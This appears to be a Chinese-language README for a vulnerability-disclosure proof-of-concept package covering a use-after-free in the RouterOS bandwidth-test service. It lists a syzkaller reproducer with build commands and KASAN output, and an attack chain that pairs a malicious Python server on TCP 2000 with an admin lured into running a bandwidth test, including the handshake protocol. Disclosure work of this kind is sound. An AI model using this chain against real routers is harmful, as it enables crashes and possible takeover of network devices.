# btest UAF PoC 包 (RouterOS 6.x-7.23.3, 未修复)

三层 PoC, 按可信度排列:

## 1. 确定性复现 (仪器化内核) — 提交时注明"可应要求提供"
- `repro.cprog` — syzkaller 最小化 C reproducer (147 行, 自包含)
  用法: gcc -x c -static -O2 -pthread -o repro repro.cprog
        在带 btest.ko 的 KASAN 内核上以 root 运行 → 3 秒内 KASAN:
        slab-out-of-bounds Write, __skb_recv_udp+0x1ee ← btest_data_ready+0x112
- `repro.report` — 原始 KASAN 报告 (2026-06, 签名基准)
- 2026-09-02 复验日志: ../../advisories/evidence/btest-syz-repro-20260902/

## 2. 真实攻击链 (出厂 RouterOS) — 公开材料里放这个
```
# 攻击者侧 (Python3, 监听 TCP 2000, 20 并发连接握手+数据洪水):
python3 evil_v4.py            # 或 evil_btest_server_loop.py (单连接版)

# 受害者 admin 侧 (RouterOS CLI, 被诱导执行):
/tool bandwidth-test address=<攻击者IP> direction=receive
# admin 停止(Ctrl-C/duration 到期)的瞬间, 仍在到达的数据包撞上
# btest_release 的 sock_put → UAF → slab 越界写
```
协议: server-first HELLO(0x01000000) → client HELLO(4B) → client Command(12B)
      → AUTH_OK(0x01000000) → 数据帧(4B LE seq + payload)
限制(如实说明): admin-gated (需 admin 主动发起); 无 KASAN 的生产内核上
竞态命中为概率性 — 已知可造成崩溃, 深度利用(RCE)为评估性质。

## 3. 生产内核检测增强复现 (slub_debug)
见 docs/tools/btest_slub_repro_rig/README.md — 出厂内核 QEMU 直启
+ slub_debug=FZPU 攻击台全套。
